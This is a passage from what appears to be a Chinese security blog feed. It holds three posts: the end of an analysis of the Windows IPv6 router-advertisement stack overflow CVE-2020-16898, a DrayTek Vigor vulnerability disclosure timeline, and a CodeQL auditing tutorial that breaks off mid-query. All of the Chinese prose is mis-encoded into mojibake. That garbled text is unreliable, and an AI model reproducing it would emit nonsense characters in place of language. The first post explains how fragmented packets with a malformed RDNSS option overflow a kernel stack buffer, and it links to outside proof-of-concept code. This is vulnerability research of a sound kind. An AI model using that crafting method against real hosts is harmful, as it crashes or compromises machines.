href="#å¦‚ä½•é€ æˆæ ˆæº¢å‡ºçš„ï¼Ÿ" class="headerlink" title="å¦‚ä½•é€ æˆæ ˆæº¢å‡ºçš„ï¼Ÿ"></a>å¦‚ä½•é€ æˆæ ˆæº¢å‡ºçš„ï¼Ÿ</h2><p>æˆ‘ä»¬çŸ¥é“æ­¤æ—¶å¯ä»¥ä¼ªé€ å‰ 8ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæ ¹æ® type å¯ä»¥èµ°ä¸åŒçš„ç¨‹åºæµ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png"></a></p><p>æ ¹æ®äº¤å‰å¼•ç”¨ï¼Œä»¥åŠæ–‡æ¡£æ­¤æ—¶çš„å‡½æ•°æœ‰ ä¸‰ç§ typeï¼Œåˆ†åˆ«ä¸º</p><p>3ï¼š break ï¼Œä¼¼ä¹æ˜¯æ­£å¸¸æ¶ˆæ¯</p><p>24ï¼šRoute Information Option</p><p>25ï¼šRDNSS Option ï¼ˆ<a href="https://tools.ietf.org/html/rfc4191#section-2.3%EF%BC%89">https://tools.ietf.org/html/rfc4191#section-2.3ï¼‰</a></p><p>å…¶ä¸­ 25 æ˜¯æˆ‘ä»¬è§¦å‘æ¼æ´çš„åœ°æ–¹ï¼Œ é‚£ä¹ˆå¯åˆ©ç”¨çš„ä¼¼ä¹åªæœ‰ 24 äº†</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>å½“ type ä¸º 24 çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨ <code>NdisGetDataBuffer</code> è¯¥å‡½æ•°ï¼Œæˆ‘ä»¬å‘ç°æ­¤å‡½æ•°çš„ v221 å€¼åœ¨æ ˆä¸Šï¼Œ Elenä¸ºå¯æ§çš„é•¿åº¦ * 8</p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer</a></p><p>æœç´¢å¾®è½¯æ–‡æ¡£æˆ‘ä»¬å‘ç°è¯¥å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PVOID NdisGetDataBuffer(</span><br><span class="line">  PNET_BUFFER NetBuffer,</span><br><span class="line">  ULONG       BytesNeeded,</span><br><span class="line">  PVOID       Storage,</span><br><span class="line">  UINT        AlignMultiple,</span><br><span class="line">  UINT        AlignOffset</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>å…¶ç¬¬ä¸€ä¸ªå‚æ•° NetBuffer ä¸ºä¸€ä¸ªæŒ‡å‘ NET_BUFFER ç»“æ„çš„æŒ‡é’ˆï¼›ç¬¬äºŒä¸ªå‚æ•° BytesNeeded ä¸ºè¯·æ±‚æ•°æ®çš„é•¿åº¦ï¼›ç¬¬ä¸‰ä¸ªå‚æ•° Storage ä¸ºæŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œå¦‚æœè°ƒç”¨è€…ä¸æä¾›ç¼“å†²åŒºï¼Œåˆ™ä¸º NULLã€‚å¦‚æœæ­¤å€¼é NULL ä¸”è¯·æ±‚çš„æ•°æ®ä¸è¿ç»­ï¼Œåˆ™ NDIS ä¼šå°†è¯·æ±‚çš„æ•°æ®å¤åˆ¶åˆ° Storage æŒ‡å‘çš„ç¼“å†²åŒºã€‚</p><p>NdisGetDataBuffer å‡½æ•°è¿”å›æŒ‡å‘è¿ç»­æ•°æ®çš„æŒ‡é’ˆï¼Œæˆ–è€…NULLã€‚å¦‚æœç¼“å†²åŒºä¸­è¯·æ±‚çš„æ•°æ®æ˜¯è¿ç»­çš„ï¼Œåˆ™è¿”å›å€¼æ˜¯æŒ‡å‘ NDIS æä¾›çš„ä½ç½®çš„æŒ‡é’ˆã€‚å¦‚æœæ•°æ®ä¸è¿ç»­ï¼Œåˆ™æ ¹æ® Storageå‚æ•°æ¥åˆ¤æ–­ï¼š</p><ul><li>å¦‚æœ Storage å‚æ•°ä¸ºé NULLï¼Œå³æŒ‡å®šç¼“å†²åŒºæŒ‡é’ˆï¼Œåˆ™ NDIS å°†æ•°æ®å¤åˆ¶åˆ°Storage æŒ‡å‘çš„ç¼“å†²åŒºä¸­ï¼Œè¿”å›å€¼ä¸º Storageå‚æ•°æŒ‡é’ˆ ã€‚</li><li>å¦‚æœ Storage å‚æ•°ä¸º NULLï¼Œåˆ™è¿”å›å€¼ä¸º NULLã€‚</li></ul><p>æ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡æ­¤å‡½æ•°è§¦å‘ç¼“å†²åŒºæº¢å‡ºï¼Œåˆ™éœ€è¦æ„é€ ä¸€ä¸ªéè¿ç»­çš„çš„æ•°æ®åŒ…ï¼Œè¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ¡ˆæ˜¯æ„é€ ä¸€ä¸ª â€œç¢ç‰‡åŒ–â€ çš„æ•°æ®ã€‚å¯¹ IPv6 æ•°æ®è¿›è¡Œåˆ†æ®µåˆ™å¯ä»¥ã€‚</p><p>å¦‚æœæˆ‘ä»¬å‘é€å¸¦æœ‰ç•¸å½¢çš„RDNSSé€‰é¡¹çš„Router Advertisementæ•°æ®åŒ…æ—¶ï¼Œå°†å…¶åˆ†å‰²æˆè‹¥å¹²ä¸ªIPv6ç¢ç‰‡ï¼Œé‚£ä¹ˆé‡æ–°ç»„åˆçš„æ•°æ®åŒ…æ•°æ®å°±ä¼šä»¥éè¿ç»­çš„æ–¹å¼å­˜å‚¨åœ¨NET_BUFFERä¸­ã€‚è¿™æ ·ä¸€æ¥ï¼Œå¯¹NdisGetDataBufferçš„è°ƒç”¨å°±ä¼šä»æˆ‘ä»¬çš„æ•°æ®åŒ…ä¸­å¤åˆ¶ä»»æ„æ•°é‡çš„å­—èŠ‚åˆ°å †æ ˆä¸­çš„å›ºå®šå¤§å°çš„ç¼“å†²åŒºä¸­ï¼Œå¯¼è‡´åŸºäºå †æ ˆçš„ç¼“å†²åŒºæº¢å‡ºï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨ä»»æ„çš„å€¼è¦†ç›–tcpipï¼Ipv6pHandleRouterAdvertisementçš„è¿”å›åœ°å€ã€‚</p><p>å¦å¤–è¿™é‡Œè¦æœ‰ç¨‹åºæœ‰ä¸€ä¸ªæ£€æŸ¥ï¼Œå®ƒå…è®¸è·¯ç”±ä¿¡æ¯é€‰é¡¹çš„æœ€å¤§å®é™…å¤§å°ï¼ˆoption.Length * 3ï¼‰ä¸º0x18ã€‚</p><p>å³åœ¨ä¸€ä¸ªå¾ªç¯éå†æ‰€æœ‰headersï¼Œåšä¸€äº›åŸºæœ¬çš„éªŒè¯</p><p>å¦‚å›¾ï¼ŒIpv6pHandleRouterAdvertisement å‡½æ•°ä¸­ä¼šæ£€æŸ¥ Route Information é€‰é¡¹ä¸­çš„ Length æ˜¯å¦å¤§äº 3 ï¼Œå¦‚æœå¤§äº 3 å°±ä¼šè¿›å…¥é”™è¯¯æµç¨‹ï¼Œç„¶åå¿½ç•¥è¿™ä¸ªåŒ…çš„ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" title="image-20201021003350639" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" alt="image-20201021003350639"></a></p><p>åœ¨æ”»å‡»çš„è¿‡ç¨‹ä¸­</p><p>Route Information é€‰é¡¹çš„å‰ 8 ä¸ªå­—èŠ‚è¢«åµŒåˆ°äº†ç¬¬ä¸€ä¸ª Recursive DNS Server é€‰é¡¹çš„æœ«å°¾ã€‚ç”±äºåœ¨ Case 0x19 çš„æ£€æŸ¥æµç¨‹ä¸­ï¼Œåªåˆ¤æ–­äº† Length æ˜¯å¦å°äº 3 ï¼Œè€Œæ²¡æœ‰åˆ¤æ–­è¯¥å­—æ®µæ˜¯å¦æ˜¯å¶æ•°å€¼ï¼Œå¯å¯¼è‡´åœ¨å¯¹æ•°æ®åŒ…é€‰é¡¹è¿›è¡Œæ£€æŸ¥çš„æ—¶å€™å°†ç¬¬ä¸€ä¸ª Recursive DNS Server é€‰é¡¹é•¿åº¦è¯¯å½“æˆ 0x20ï¼Œå› æ­¤æ£€æŸ¥æ˜¯é€šè¿‡çš„ã€‚è€Œåœ¨çœŸæ­£å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œåˆå°†å…¶é•¿åº¦è§£æä¸º 0x18</p><p>å¯¹äºtypeä¸º0x18ä¼šè¿›å…¥ä¸‹é¢çš„æµç¨‹å¤„ç†ï¼Œè°ƒç”¨NdisGetDataBufferå‡½æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°ä¸ºé•¿åº¦çš„å®é™…å­—èŠ‚å¤§å°ï¼Œç­‰äºlength<em>8ï¼Œæ‰€ä»¥æ­¤æ—¶ä¼ å…¥çš„actual_length_bytes = 0x22</em> 8 = 0x110ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>è€ŒStorage_1 ä¸ºæ ˆä¸Šçš„æ•°ç»„å˜é‡ï¼Œå°†0x110ä¸ªå­—èŠ‚èµ‹å€¼è¿‡å»ï¼Œå°±ä¼šé€ æˆæ ˆä¸Šçš„æº¢å‡ºï¼Œå®é™…çš„å´©æºƒæ˜¯æº¢å‡ºè¦†ç›–äº†stack cookieï¼Œè§¦å‘tcpip!_security_check_cookieï¼Œé€ æˆè“å±ï¼ˆBSODï¼‰ï¼š</p><p>æœ€åè´´ä¸€ä¸ªè“å±ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png"></a></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html">https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html</a></p><p><a href="http://site.pi3.com.pl/exp/p_CVE-2020-16898.py">http://site.pi3.com.pl/exp/p_CVE-2020-16898.py</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-16898 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DrayTek Vigor 2960 ä»æœªæˆæƒåˆ°rce</title>
      <link href="drayteck-vigor-vulnerability-disclosure.html"/>
      <url>drayteck-vigor-vulnerability-disclosure.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>4æœˆå¤šçš„æ—¶å€™å‡ºå·®å»äº†å—äº¬ï¼ŒåŠ ä¸Šä¸‰æœˆåˆçš„æ—¶å€™ 360 netlab å…¬å¼€ä¸¤ä¸ª DrayTek çš„æ¼æ´ï¼Œæˆ‘ä¹Ÿç®€å•åˆ†æäº†ä¸€ä¸‹ä»¥åŠå¤ç°äº†ä¸‹ exploit ï¼Œè¿™é‡Œå°±ä¸ç»†è®²äº†ã€‚æ‰€ä»¥æ™šä¸Šæ— èŠçš„æ—¶å€™åœ¨æ‰¾è¿™ä¸ªè®¾å¤‡çš„æ˜¯å¦å­˜åœ¨å…¶ä»–æ¼æ´ï¼Œåˆšå¥½å·§åˆçš„æ˜¯  @C0ss4ckï¼ˆä¹‹å‰åœ¨æˆ‘å¸å®ä¹ è¿‡ï¼‰ ä»–ä¹Ÿåœ¨çœ‹ï¼Œæ‰€ä»¥ä¸€èµ·æŒ–æ˜äº†ä»¥ä¸‹ 11ä¸ªæ¼æ´</p><p>è¿™é‡Œå…¬å¼€çš„ PPT ç”±@C0ss4ck å’Œæˆ‘å®Œæˆï¼Œç”±äºæ—¶é—´å®‰æ’æ‰€ä»¥æˆ‘æ²¡å» DEFCON GROUP 25</p><div class="row"><iframe src="https://drive.google.com/file/d/1z4QZctHU3XYB-X9jXiWrTGhMLJqP27ub/preview" style="width:100%; height:550px"></iframe></div><p>å¯èƒ½æœ‰çš„äººå°±é—®äº†ï¼Œ11 ä¸ªæ¼æ´ï¼Œä¸ºå•¥åªæœ‰ 2ä¸ª cve å·å‘¢ï¼Ÿ å¾ˆç®€å•ï¼Œç”±äºæŸäº›åŸå› å¤§å®¶éƒ½çŸ¥é“ CVE ä¼¼ä¹ä¸æ€ä¹ˆç†ä¸ªäººç”³è¯·äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‹œæ‰˜çš„å‚å•†å¸®æˆ‘ä»¬ç”³è¯·çš„ï¼Œå‚å•†æŠŠæ¼æ´åˆ†æˆ å‘½ä»¤æ³¨å…¥å’Œç¼“å†²åŒºæº¢å‡º ä¸€èµ·åˆ†æ‰¹ç”³è¯·çš„ï¼Œç„¶å CVE åªç»™äº†ä¸¤ä¸ªç¼–å· ï¼ˆorzï¼‰</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li>2020.05.29 report these vulnerabilities</li><li>2020.06.01 vendor reply</li><li>2020.06.04 vendor fix these vulnerabilities</li><li>2020.06.17 vendor released new firmware</li><li>2020.06.19 CVE-2020-14472, CVE-2020-14473</li></ul><h2 id="å®˜æ–¹è‡´è°¢"><a href="#å®˜æ–¹è‡´è°¢" class="headerlink" title="å®˜æ–¹è‡´è°¢"></a>å®˜æ–¹è‡´è°¢</h2><p><a href="https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-remote-code-injection/execution-vulnerability-(cve-2020-14472)/">https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-remote-code-injection/execution-vulnerability-(cve-2020-14472)/</a></p><p><a href="https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-stack-based-buffer-overflow-vulnerability-(cve-2020-14473)/">https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-stack-based-buffer-overflow-vulnerability-(cve-2020-14473)/</a></p><h2 id="æ¼æ´è¯¦æƒ…"><a href="#æ¼æ´è¯¦æƒ…" class="headerlink" title="æ¼æ´è¯¦æƒ…"></a>æ¼æ´è¯¦æƒ…</h2><p><a href="https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240">https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240</a><br><a href="https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md">https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DrayTek </tag>
            
            <tag> CVE-2020-14472 </tag>
            
            <tag> CVE-2020-14473 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeQL çš„å­¦ä¹ ä»¥åŠå°è¯•æ¼æ´æŒ–æ˜</title>
      <link href="codeql.html"/>
      <url>codeql.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="CodeQL-èƒŒæ™¯"><a href="#CodeQL-èƒŒæ™¯" class="headerlink" title="CodeQL èƒŒæ™¯"></a>CodeQL èƒŒæ™¯</h2><p>CodeQL æ˜¯ä¸€ä¸ªç™½ç›’æºä»£ç å®¡è®¡å·¥å…·ã€‚å…¶å¼€å‘å…¬å¸ Semmle ä¹ŸæˆåŠŸå’Œ Github è”å§»ï¼Œæˆç«‹äº† Github Security Labï¼Œè´Ÿè´£ Github ä¸Šå¼€æºè½¯ä»¶çš„ä»£ç å®‰å…¨å®¡è®¡ã€‚</p><p>ç½‘ä¸Šå…³äºè¯¥å·¥å…·çš„å®‰è£…æ•™ç¨‹è§å®˜æ–¹æ–‡æ¡£ï¼Œé¡ºä¾¿ä¸€è¯´ç½‘ä¸Šçš„æ•™ç¨‹ä¹Ÿä¸å°‘ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚</p><h2 id="CodeQL-ä½¿ç”¨"><a href="#CodeQL-ä½¿ç”¨" class="headerlink" title="CodeQL ä½¿ç”¨"></a>CodeQL ä½¿ç”¨</h2><p>å®˜æ–¹æä¾›äº† QL è¯­æ³•çš„æ–‡æ¡£ï¼š <a href="https://help.semmle.com/QL/ql-handbook/">https://help.semmle.com/QL/ql-handbook/</a> ä»¥åŠ CodeQL çš„ä¸€äº› api æ¥å£ <a href="https://help.semmle.com/qldoc/cpp/">https://help.semmle.com/qldoc/cpp/</a></p><p>å…³äºCodeQL ä½¿ç”¨ï¼Œåœ¨è¿™ç¯‡æ–‡ç« å’±ä»¬ä»¥ä¸€ä¸ª Github Security Lab å…¬å¼€çš„æ•™ç¨‹ä½œä¸ºç¤ºä¾‹ </p><p>CodeQL CTF 2: U-Boot</p><ul><li><a href="https://securitylab.github.com/ctf/uboot">CTF 2: U-Boot Challenge</a> - Follow in the footsteps of our security research team and discover 13 vulnerabilities un U-Boot. Language: C - Difficulty level: </li></ul><h3 id="0x01-æŸ¥æ‰¾ç‰¹å®šå‡½æ•°çš„å®šä¹‰"><a href="#0x01-æŸ¥æ‰¾ç‰¹å®šå‡½æ•°çš„å®šä¹‰" class="headerlink" title="0x01 æŸ¥æ‰¾ç‰¹å®šå‡½æ•°çš„å®šä¹‰"></a>0x01 æŸ¥æ‰¾ç‰¹å®šå‡½æ•°çš„å®šä¹‰</h3><p>CodeQL ä½¿ç”¨çš„æ—¶å€™éœ€è¦é€šè¿‡ <code>import</code>  å…³é”®è¯å¯¼å…¥ç‰¹å®šè¯­è¨€çš„è§£æåº“ï¼Œä¾‹å¦‚è¿™é‡Œä½¿ç”¨çš„æ˜¯ <code>import cpp</code> ï¼Œå¦‚æœæˆ‘è¦æŸ¥è¯¢ <code>strlen</code> çš„å‡½æ•°å®šä¹‰ï¼Œæˆ‘åªéœ€è¦ç¼–å†™å¦‚ä¸‹ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() &#x3D; &quot;strlen&quot;</span><br><span class="line">select f, &quot;a function named strlen&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å³é”®ç‚¹å‡»è¿è¡Œï¼Œæ•ˆæœå¦‚ä¸‹</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173438.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173438.png"></a></p><p>å…¶ä¸­ç¬¬ä¸‰ä¸ªæ˜¯å…³äº <code>strlen</code> çš„å®šä¹‰ï¼Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173541.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173541.png"></a></p><h3 id="0x2-æŸ¥æ‰¾ç‰¹å®šå®å®šä¹‰"><a href="#0x2-æŸ¥æ‰¾ç‰¹å®šå®å®šä¹‰" class="headerlink" title="0x2 æŸ¥æ‰¾ç‰¹å®šå®å®šä¹‰"></a>0x2 æŸ¥æ‰¾ç‰¹å®šå®å®šä¹‰</h3><p>ä½†æ˜¯åœ¨ c ä»£ç é‡Œï¼Œ æœ‰äº›æƒ…å†µæˆ‘ä»¬éœ€è¦æŸ¥æ‰¾å®çš„å®šä¹‰ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ä½¿ç”¨ <code>Macro</code> è¿™ä¸ª Predicatesï¼Œ ä¾‹å¦‚æ ·ä¾‹é‡Œæåˆ°çš„ <code>ntohs</code> æ—ï¼Œå‡½æ•°</p><!--**`ntohl`ï¼Œ`ntohll`å’Œ`ntohs`å¯ä»¥æ˜¯å‡½æ•°æˆ–å®ï¼ˆå–å†³äºå…¶ä¸­çš„ä»£ç è¢«ç¼–è¯‘åœ¨å¹³å°ä¸Šï¼‰ã€‚**--><p>å¦å¤–ï¼Œ QL è¯­è¨€æ”¯æŒæ­£åˆ™åŒ¹é…ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>regexpMatch</code> åŒ¹é…ä¸€ç±»å‡½æ•°ä¾‹å¦‚å¦‚ä¸‹ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Macro m</span><br><span class="line">where m.getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select m</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x3-å‡½æ•°çš„è°ƒç”¨"><a href="#0x3-å‡½æ•°çš„è°ƒç”¨" class="headerlink" title="0x3 å‡½æ•°çš„è°ƒç”¨"></a>0x3 å‡½æ•°çš„è°ƒç”¨</h3><p>åœ¨ä»£ç å®¡è®¡çš„åœºæ™¯é‡Œï¼Œæˆ‘ä»¬åœ¨æŸ¥æ‰¾å‡½æ•°å®šä¹‰çš„åŒæ—¶ï¼Œä¹Ÿéœ€è¦æ ¹æ®å‡½æ•°è°ƒç”¨æŸ¥æ‰¾å®Œæ•´çš„æ•°æ®æµï¼Œåœ¨ CodeQL é‡Œï¼Œå‡½æ•°çš„è°ƒç”¨é€šè¿‡ <code>FunctionCall</code> è¿™ä¸ª Predicates å¯ä»¥ç›´æ¥å®Œæˆï¼Œä¾‹å¦‚å¦‚ä¸‹ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall c</span><br><span class="line">where c.getTarget().getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910174736.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910174736.png"></a></p><h3 id="0x04-å®å®šä¹‰çš„è°ƒç”¨"><a href="#0x04-å®å®šä¹‰çš„è°ƒç”¨" class="headerlink" title="0x04 å®å®šä¹‰çš„è°ƒç”¨"></a>0x04 å®å®šä¹‰çš„è°ƒç”¨</h3><p>æŸ¥æ‰¾å®å®šä¹‰çš„çš„è°ƒç”¨ï¼Œä½¿ç”¨ <code>MacroInvocation</code> å®Œæˆï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select mi</span><br></pre></td></tr></table></figure><h3 id="0x05-è·å–-ntohs-æ—å®å®šä¹‰çš„è¡¨è¾¾å¼"><a href="#0x05-è·å–-ntohs-æ—å®å®šä¹‰çš„è¡¨è¾¾å¼" class="headerlink" title="0x05 è·å– ntohs æ—å®å®šä¹‰çš„è¡¨è¾¾å¼"></a>0x05 è·å– ntohs æ—å®å®šä¹‰çš„è¡¨è¾¾å¼</h3><p>åœ¨ 0x04 ä¸­ï¼Œæˆ‘ä»¬æåˆ°äº†å®å®šä¹‰çš„è°ƒç”¨ï¼Œå¦å¤–æˆ‘ä»¬çŸ¥é“ï¼Œ <code>ntoh</code> æ—å‡½æ•°ï¼Œé€šå¸¸ç”¨æ¥è¿›è¡Œç½‘ç»œå­—èŠ‚åºåˆ°ä¸»æœºå­—èŠ‚åºçš„è½¬æ¢ï¼Œé€šå¸¸è€Œè¨€ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªç½‘ç»œåè®®ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šä»æŸä¸ªå­—æ®µä¸­å–å‡ºæŸä¸ªç‰¹å®šçš„å€¼ï¼Œå¹¶ä¸”èµ‹å€¼ç»™æŸä¸ªå˜é‡ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦è·å–ä»–ä»¬çš„è¡¨è¾¾å¼ã€‚</p><p>è¿™é‡Œä»¥è¡¨è¾¾å¼å‡ºç°çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>getExpr()</code>å‡½æ•°å®Œæˆï¼Œä»…ä»…åªéœ€è¦å°† <code>select mi</code> ä¿®æ”¹ä¸º <code>select mi.getExpr()</code> ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select mi.getExpr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910175832.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910175832.png"></a></p><p>ä¾‹å¦‚è¿™é‡Œçš„èµ‹å€¼è¯­å¥å°±æ˜¯ç¬¬ 78 ä¸ªè¡¨è¾¾å¼</p><h3 id="0x06-ç¼–å†™ä¸€ä¸ª-QL-ç±»"><a href="#0x06-ç¼–å†™ä¸€ä¸ª-QL-ç±»" class="headerlink" title="0x06 ç¼–å†™ä¸€ä¸ª QL ç±»"></a>0x06 ç¼–å†™ä¸€ä¸ª QL ç±»</h3><p>QL ç±»åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†</p><ol><li>å…³é”®å­—<code>class</code>ã€‚</li><li>ç±»çš„åç§°ã€‚è¿™æ˜¯ä¸€ä¸ª ä»¥å¤§å†™å­—æ¯å¼€å¤´çš„<a href="https://help.semmle.com/QL/ql-spec/language.html#identifiers">æ ‡è¯†ç¬¦</a>ã€‚</li><li>è¦æ‰©å±•çš„ç±»å‹ã€‚</li><li><a href="https://help.semmle.com/QL/ql-handbook/types.html#class-bodies">ç±»</a>çš„<a href="https://help.semmle.com/QL/ql-handbook/types.html#class-bodies">ä¸»ä½“</a>ï¼Œç”¨å¤§æ‹¬å·æ‹¬èµ·æ¥ã€‚</li></ol><p>æ›´å¤šå…³äºç±»çš„ç¼–å†™å¯ä»¥å‚è€ƒ <a href="https://help.semmle.com/QL/ql-handbook/types.html#classes">https://help.semmle.com/QL/ql-handbook/types.html#classes</a></p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦ç¼–å†™å°è¯•ç¼–å†™ä¸€ä¸ª <code>NetworkByteSwap</code> çš„ç±»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * An expression involved when swapping the byte order of network data.</span><br><span class="line"> * Its value is likely to have been read from the network.</span><br><span class="line"> *&#x2F;</span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists(MacroInvocation mi |</span><br><span class="line">      